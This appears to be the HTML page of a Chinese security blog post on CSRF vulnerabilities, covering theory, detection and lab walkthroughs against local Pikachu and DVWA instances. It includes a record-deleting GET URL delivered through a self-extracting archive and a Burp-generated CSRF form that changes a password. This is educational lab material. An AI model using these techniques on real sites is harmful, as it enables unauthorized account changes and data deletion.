@@ -1,0 +1,878 @@
+
+  <!DOCTYPE html>
+  <html lang="en"  
+    
+      data-theme-mode="auto"
+    
+  >
+  <head>
+  
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_0khxww3tj3q9';window.REIMU_CONFIG.clipboard_tips = {"success":{"en":"Copy successfully (*^▽^*)","zh-CN":"复制成功 (*^▽^*)","zh-TW":"複製成功 (*^▽^*)","ja":"コピー成功 (*^▽^*)","pt-BR":"Copiado com sucesso (*^▽^*)"},"fail":{"en":"Copy failed (ﾟ⊿ﾟ)ﾂ","zh-CN":"复制失败 (ﾟ⊿ﾟ)ﾂ","zh-TW":"複製失敗 (ﾟ⊿ﾟ)ﾂ","ja":"コピー失敗 (ﾟ⊿ﾟ)ﾂ","pt-BR":"Falha ao copiar (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = 'All articles on this blog are licensed under the BY-NC-SA license agreement unless otherwise stated. Please indicate the source when reprinting!';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'http://example.com';window.REIMU_CONFIG.i18n_languages = ["en"];</script>
+  
+  <title>
+    CSRF漏洞 |
+    
+    mX1@0_blog
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  
+  
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_0khxww3tj3q9.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="CSRF漏洞CSRF原理CSRF（Cross-Site Request Forgery，跨站请求伪造） 主要涉及到攻击者利用受害者尚未失效的身份认证信息（如cookie、会话令牌等），通过诱导用户点击恶意链接或访问包含攻击代码的页面，从而在用户不知情的情况下以受害者的身份向服务器发送请求，完成非法操作（如转账、修改密码等）     CSRF分类站外和站内 站内  CSRF站内类型的漏洞在一定程度上">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CSRF漏洞">
+<meta property="og:url" content="http://example.com/en/2024/09/04/csrf-lou-dong/index.html">
+<meta property="og:site_name" content="mX1@0_blog">
+<meta property="og:description" content="CSRF漏洞CSRF原理CSRF（Cross-Site Request Forgery，跨站请求伪造） 主要涉及到攻击者利用受害者尚未失效的身份认证信息（如cookie、会话令牌等），通过诱导用户点击恶意链接或访问包含攻击代码的页面，从而在用户不知情的情况下以受害者的身份向服务器发送请求，完成非法操作（如转账、修改密码等）     CSRF分类站外和站内 站内  CSRF站内类型的漏洞在一定程度上">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66d825ced9c307b7e9f114f8.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66d82678d9c307b7e9f2adcf.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66d82694d9c307b7e9f2dd3b.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66d83e07d9c307b7e9194078.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66d83ee1d9c307b7e91ad003.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66d840aed9c307b7e91d79c9.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66d840ded9c307b7e91dbe9d.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66d840f6d9c307b7e91de5f3.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66d84117d9c307b7e91e21b8.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66d841a2d9c307b7e91f67b4.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66d877ded9c307b7e96d7626.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66d8783bd9c307b7e96dcc33.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66d87885d9c307b7e96e151f.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66d878c6d9c307b7e96e532b.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66d8796cd9c307b7e96ef20b.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66d879edd9c307b7e96f653f.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66d87a98d9c307b7e97002e5.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66d87eb7d9c307b7e973ed0e.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66d87fb4d9c307b7e974e6f8.png">
+<meta property="article:published_time" content="2024-09-04T03:42:00.762Z">
+<meta property="article:modified_time" content="2024-09-12T01:26:46.529Z">
+<meta property="article:author" content="mX1@0">
+<meta property="article:tag" content="CSRF漏洞">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic.imgdb.cn/item/66d825ced9c307b7e9f114f8.png">
+  
+  
+  
+    <link rel="shortcut icon" href="/images/%E5%9B%BE1.jpg">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" as="style" onload="this.onload&#x3D;null;this.rel&#x3D;&#39;stylesheet&#39;" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" integrity="sha384-IfxC36XL&#x2F;toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei+Zx&#x2F;1oA&#x2F;0l8ysE" crossorigin="anonymous">
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css" integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous">
+
+  
+  
+  
+<meta name="generator" content="Hexo 7.2.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="stylesheet" href="/css/prism.css" type="text/css"></head>
+
+  <body>
+    
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      
+      
+        
+      
+      <div class="loading-word">Loading...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+<div id="heatmap-tooltip"></div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+             
+              &#xe62b;
+             
+          </div>
+          <a class="main-nav-link" href="/en/">首页</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+             
+              &#xe62b;
+             
+          </div>
+          <a class="main-nav-link" href="/en/archives">归类</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+             
+              &#xe62b;
+             
+          </div>
+          <a class="main-nav-link" href="/en/about">关于</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+             
+              &#xe62b;
+             
+          </div>
+          <a class="main-nav-link" href="/en/friend">链接</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+    
+    
+  </nav>
+  
+    
+    <nav id="i18n-nav">
+      <div class="custom-dropdown">
+        <div class="select-selected" id="select-selected">
+          <span id="nav-language-btn" class="nav-icon" style="padding: 0 20px 0 0"></span>
+          <span id="selected-lang">English</span>
+        </div>
+        <ul class="select-items" id="select-items">
+          
+            <li data-value="zh-CN" >简体中文</li>
+          
+            <li data-value="en" class="selected">English</li>
+          
+        </ul>
+      </div>
+      <script>
+        var selectSelected = document.getElementById("select-selected");
+        var selectedLang = document.getElementById("selected-lang");
+        var selectItems = document.getElementById("select-items");
+        var selectOptions = selectItems.querySelectorAll("li");
+
+        selectSelected.addEventListener("click", () => {
+          selectItems.classList.toggle("show");
+        });
+
+        selectOptions.forEach((item) => {
+          item.addEventListener("click", () => {
+            const langMap = {};
+            
+              langMap['zh-CN'] = '/2024/09/04/csrf-lou-dong/';
+            
+              langMap['en'] = '/en/2024/09/04/csrf-lou-dong/';
+            
+            selectedLang.textContent = item.textContent;
+            selectItems.classList.remove("show");
+            selectOptions.forEach((option) => {
+              option.classList.remove("selected");
+            });
+            item.classList.add("selected");
+            window.location = langMap[item.dataset.value];
+          });
+        });
+
+        document.addEventListener("click", (event) => {
+          if (!event.target.closest(".custom-dropdown")) {
+            selectItems.classList.remove("show");
+          }
+        });
+      </script>
+    </nav>
+  
+</div>
+<header id="header">
+  
+    
+      
+        <picture></picture>
+        <img  fetchpriority="high" src="https://picsum.photos/1600/900?random=1" alt="CSRF漏洞">
+      
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">CSRF漏洞</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content"  class="sidebar-right" >
+          <aside id="sidebar">
+  
+  
+  
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        
+          <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">Contents</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CSRF%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text">CSRF漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CSRF%E5%8E%9F%E7%90%86"><span class="toc-number">1.1.</span> <span class="toc-text">CSRF原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSRF%E5%88%86%E7%B1%BB"><span class="toc-number">1.2.</span> <span class="toc-text">CSRF分类</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%99%E5%A4%96%E5%92%8C%E7%AB%99%E5%86%85"><span class="toc-number">1.2.1.</span> <span class="toc-text">站外和站内</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B"><span class="toc-number">1.3.</span> <span class="toc-text">漏洞检测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSRF%E5%92%8CXSS%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">1.4.</span> <span class="toc-text">CSRF和XSS的区别</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%9C%BA%E6%99%AF%E4%BE%8B%E5%AD%90"><span class="toc-number">1.5.</span> <span class="toc-text">攻击场景例子</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C"><span class="toc-number">1.6.</span> <span class="toc-text">攻击实验</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%87%AA%E8%A7%A3%E5%8E%8B%E6%96%87%E4%BB%B6%E5%AE%8C%E6%88%90CSRF%E6%94%BB%E5%87%BB%E5%88%A0%E9%99%A4%E7%BD%91%E7%AB%99%E6%95%B0%E6%8D%AE%EF%BC%88GET%E8%AF%B7%E6%B1%82%EF%BC%89"><span class="toc-number">1.6.1.</span> <span class="toc-text">自解压文件完成CSRF攻击删除网站数据（GET请求）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8EPOST%E8%AF%B7%E6%B1%82%E7%9A%84%E8%B4%A6%E5%8F%B7%E5%88%9B%E5%BB%BA"><span class="toc-number">1.6.2.</span> <span class="toc-text">基于POST请求的账号创建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9%E5%AF%86%E7%A0%81"><span class="toc-number">1.6.3.</span> <span class="toc-text">修改密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#referer%E8%AF%B7%E6%B1%82%E5%A4%B4%E9%98%B2%E5%BE%A1%E5%92%8C%E7%BB%95%E8%BF%87"><span class="toc-number">1.6.4.</span> <span class="toc-text">referer请求头防御和绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#token%E7%9A%84%E9%98%B2%E5%BE%A1%E5%92%8C%E7%BB%95%E8%BF%87"><span class="toc-number">1.6.5.</span> <span class="toc-text">token的防御和绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSRFtester%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8"><span class="toc-number">1.7.</span> <span class="toc-text">CSRFtester工具使用</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/%E5%9B%BE1.jpg" data-sizes="auto" alt="mX1@0" class="lazyload">
+  <div class="sidebar-author-name">mX1@0</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Post</div>
+    <div class="sidebar-state-number">64</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Category</div>
+    <div class="sidebar-state-number">18</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tag</div>
+    <div class="sidebar-state-number">25</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/en/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/en/archives" aria-label="归类"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">归类</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/en/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/en/friend" aria-label="链接"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">链接</div>
+      </div>
+    
+  
+</div>
+</div>
+        
+      
+      
+        
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+        
+      
+    </div>
+  </div>
+
+  <div class="sidebar-widget">
+  
+  </div>
+  
+</aside>
+
+          <section id="main"><article id="post-CSRF漏洞" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link" data-aos="zoom-in">
+    <time datetime="2024-09-04T03:42:00.762Z" itemprop="datePublished">2024-09-04</time>
+    <time style="display: none;" id="post-update-time">2024-09-12</time>
+  </span>
+</div>
+
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/en/categories/Web%E5%AE%89%E5%85%A8/" data-aos="zoom-in">Web安全</a>
+  </div>
+
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <h1 id="CSRF漏洞"><a href="#CSRF漏洞" class="headerlink" title="CSRF漏洞"></a>CSRF漏洞</h1><h2 id="CSRF原理"><a href="#CSRF原理" class="headerlink" title="CSRF原理"></a>CSRF原理</h2><p>CSRF（Cross-Site Request Forgery，跨站请求伪造）</p>
+<p>主要涉及到攻击者利用受害者尚未失效的身份认证信息（如cookie、会话令牌等），通过诱导用户点击恶意链接或访问包含攻击代码的页面，从而在用户不知情的情况下以受害者的身份向服务器发送请求，完成非法操作（如转账、修改密码等）</p>
+<img src="https://pic.imgdb.cn/item/66d825ced9c307b7e9f114f8.png" style="zoom:67%;">
+
+
+
+<h2 id="CSRF分类"><a href="#CSRF分类" class="headerlink" title="CSRF分类"></a>CSRF分类</h2><h3 id="站外和站内"><a href="#站外和站内" class="headerlink" title="站外和站内"></a>站外和站内</h3><ol>
+<li>站内</li>
+</ol>
+<p>CSRF站内类型的漏洞在一定程度上是由于程序员滥用$_REQUEST类变量造成的。在一些敏感的操作中(如修改密码、添加用户等)，本来要求用户从表单提交发起POST请求传递参数给程序，但是由于使用了$_REQUEST等变量，程序除支持接收POST请求传递的参数外也支持接收GET请求传递的参数，这样就会为攻击者使用CSRF攻击创造条件。一般攻击者只要把预测的请求参数放在站内一个贴子或者留言的图片链接里，通过get请求来攻击，受害者浏览了这样的页面就会被强迫发起这些请求。</p>
+<ol start="2">
+<li>站外</li>
+</ol>
+<p>CSRF站外类型的漏洞本质上就是传统意义上的外部提交教据问题。通常程序员会考虑给一些留言或者评论的表单加上水印以防止SPAM问题(这里，SPAM可以简单的理解为垃圾留言、垃圾评论，或者是带有站外链接的恶意回复)，但是有时为了提高用户的体验性，可能没有对一些操作做任何限制，所以攻击者可以事先预测并设置请求的参数，在站外的Web页面里编写脚本伪造文件请求，或者和自动提交的表单一起使用来实现GET、POST请求，当用户在会话状态下点击链接访问站外Web页面，客户端就被强迫发起请求。</p>
+<h2 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p>1.最简单的方法就是抓取一个正常请求的数据包，去掉Referer字段后再重新提交，如果该提交还有效，那么基本上可以确定存在CSRF漏洞。</p>
+<p>2.对目标站点增删改查的地方进行标记，并观察逻辑，判断请求是否可以伪造。</p>
+<p>比如修改管理员账号时，不需要验证旧密码</p>
+<p>比如修改敏感信息不需要token验证（确认凭证的有效期）</p>
+<p>虽然退出或关闭了览器，但Cookie仍然有效，或者Session没有及时过期，导致CSRF攻击变得简单</p>
+<h2 id="CSRF和XSS的区别"><a href="#CSRF和XSS的区别" class="headerlink" title="CSRF和XSS的区别"></a>CSRF和XSS的区别</h2><ul>
+<li><p>CSRF是借助用户的权限完成攻击，攻击者并没有拿到用户的权限。目标构造修改个人信息的链接，利用lucy在登录状态下点击此链接达到修改信息的目的。</p>
+</li>
+<li><p>XSS直接盗取了用户的权限，然后实施破坏。攻击者利用XSS盗取了目标的Cookie，登录lucy的后台，再修改相关信息。</p>
+</li>
+</ul>
+<h2 id="攻击场景例子"><a href="#攻击场景例子" class="headerlink" title="攻击场景例子"></a>攻击场景例子</h2><p><img src="https://pic.imgdb.cn/item/66d82678d9c307b7e9f2adcf.png"></p>
+<p>lucy想要在购物网站上修改购物地址，这个操作是lucy通过浏览器向后端发送了请求。这个请求里面包含了lucy的新的收货地址，如果是通过GET提交的，那么会以URL传参的方式的方式将新的地址提交给后台，类似上图中的URL，相当于点了链接就能修改个人信息。</p>
+<p>如果这时候攻击者想要修改lucy的信息怎么办？那么他需要取得lucy的账号，获得登录权限。这时候他可以将修改个人信息的请求伪造一下，构造类似下图中的URL，引诱lucy在登录状态下进行点击，这样攻击就成功了。</p>
+<p><img src="https://pic.imgdb.cn/item/66d82694d9c307b7e9f2dd3b.png"></p>
+<h2 id="攻击实验"><a href="#攻击实验" class="headerlink" title="攻击实验"></a>攻击实验</h2><h3 id="自解压文件完成CSRF攻击删除网站数据（GET请求）"><a href="#自解压文件完成CSRF攻击删除网站数据（GET请求）" class="headerlink" title="自解压文件完成CSRF攻击删除网站数据（GET请求）"></a>自解压文件完成CSRF攻击删除网站数据（GET请求）</h3><p><img src="https://pic.imgdb.cn/item/66d83e07d9c307b7e9194078.png"></p>
+<p>管理员正常登陆界面</p>
+<p>要获取管理员删除数据的url，用bp抓包</p>
+<p><img src="https://pic.imgdb.cn/item/66d83ee1d9c307b7e91ad003.png"></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.116.34/pikachu-master/pikachu-master/vul/overpermission/op2/op2_admin.php?id=25</span><br></pre></td></tr></tbody></table></figure>
+
+<p>这个动作也就是删除数据包的get请求的数据包，所以只要获得了管理员的cookie，访问这个url就可以删除对应id的数据</p>
+<p>那么现在就做一个自解压的压缩包，并且设置解压后访问此攻击url，如果管理员正在访问此界面，并且解压了这个攻击压缩包，那么就攻击成功，此id的用户被删除</p>
+<p>制作自解压压缩包：</p>
+<img src="https://pic.imgdb.cn/item/66d840aed9c307b7e91d79c9.png" style="zoom:50%;">
+
+<img src="https://pic.imgdb.cn/item/66d840ded9c307b7e91dbe9d.png" style="zoom:50%;">
+
+<p><img src="https://pic.imgdb.cn/item/66d840f6d9c307b7e91de5f3.png"></p>
+<p>未攻击之前页面数据：</p>
+<p><img src="https://pic.imgdb.cn/item/66d84117d9c307b7e91e21b8.png"></p>
+<p>解压压缩包，攻击之后id=16的数据（最后一条）被删除</p>
+<p><img src="https://pic.imgdb.cn/item/66d841a2d9c307b7e91f67b4.png"></p>
+<h3 id="基于POST请求的账号创建"><a href="#基于POST请求的账号创建" class="headerlink" title="基于POST请求的账号创建"></a>基于POST请求的账号创建</h3><p>用户准备更改信息</p>
+<p><img src="https://pic.imgdb.cn/item/66d877ded9c307b7e96d7626.png"></p>
+<p>bp抓包，是一个POST包</p>
+<p><img src="https://pic.imgdb.cn/item/66d8783bd9c307b7e96dcc33.png"></p>
+<p>用bp自带的工具，生成CSRF POC </p>
+<p><img src="https://pic.imgdb.cn/item/66d87885d9c307b7e96e151f.png"></p>
+<p>并将生成的html代码，放到文件中，生成一个html文件</p>
+<p><img src="https://pic.imgdb.cn/item/66d878c6d9c307b7e96e532b.png"></p>
+<p>让受害者点开html中的按钮</p>
+<p><img src="https://pic.imgdb.cn/item/66d8796cd9c307b7e96ef20b.png"></p>
+<p>未更改信息之前：</p>
+<p><img src="https://pic.imgdb.cn/item/66d879edd9c307b7e96f653f.png"></p>
+<p>受害者在登陆的情况下，同时用与登录相同的浏览器打开攻击html之后，点击按钮，信息被更改</p>
+<p><img src="https://pic.imgdb.cn/item/66d87a98d9c307b7e97002e5.png"></p>
+<h3 id="修改密码"><a href="#修改密码" class="headerlink" title="修改密码"></a>修改密码</h3><p><img src="https://pic.imgdb.cn/item/66d87eb7d9c307b7e973ed0e.png"></p>
+<p>在修改密码页面，bp抓包，然后放到重发器中，丢弃包</p>
+<p><img src="https://pic.imgdb.cn/item/66d87fb4d9c307b7e974e6f8.png"></p>
+<p>按理来说，这里应该不用输入原密码，这样才是一个没有防护的状态</p>
+<p>生成一个html页面</p>
+<figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">history.<span class="title function_">pushState</span>(<span class="string">''</span>, <span class="string">''</span>, <span class="string">'/'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://192.168.116.34/DVWA-master/DVWA-master/vulnerabilities/csrf/"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"password<span class="symbol">&amp;#95;</span>current"</span> <span class="attr">value</span>=<span class="string">"password"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"password<span class="symbol">&amp;#95;</span>new"</span> <span class="attr">value</span>=<span class="string">"123"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"password<span class="symbol">&amp;#95;</span>conf"</span> <span class="attr">value</span>=<span class="string">"123"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"Change"</span> <span class="attr">value</span>=<span class="string">"Change"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"user<span class="symbol">&amp;#95;</span>token"</span> <span class="attr">value</span>=<span class="string">"443fb9acbff8f91ecbbed26b2e5a7cf3"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit request"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>让受害用相同的浏览器打开，并点击，则修改密码</p>
+<h3 id="referer请求头防御和绕过"><a href="#referer请求头防御和绕过" class="headerlink" title="referer请求头防御和绕过"></a>referer请求头防御和绕过</h3><h3 id="token的防御和绕过"><a href="#token的防御和绕过" class="headerlink" title="token的防御和绕过"></a>token的防御和绕过</h3><h2 id="CSRFtester工具使用"><a href="#CSRFtester工具使用" class="headerlink" title="CSRFtester工具使用"></a>CSRFtester工具使用</h2>
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/en/tags/CSRF%E6%BC%8F%E6%B4%9E/" rel="tag">CSRF漏洞</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" data-aos="fade-up">
+    
+      
+      <div class="article-nav-link-wrap article-nav-link-left">
+        
+          
+          
+            <img data-src="/images/%E7%8E%9B%E8%8E%8E%E6%8B%89%E8%92%82.jpg" data-sizes="auto" alt="cookie和session" class="lazyload">
+          
+        
+        <a href="/en/2024/09/04/cookie-he-session/"></a>
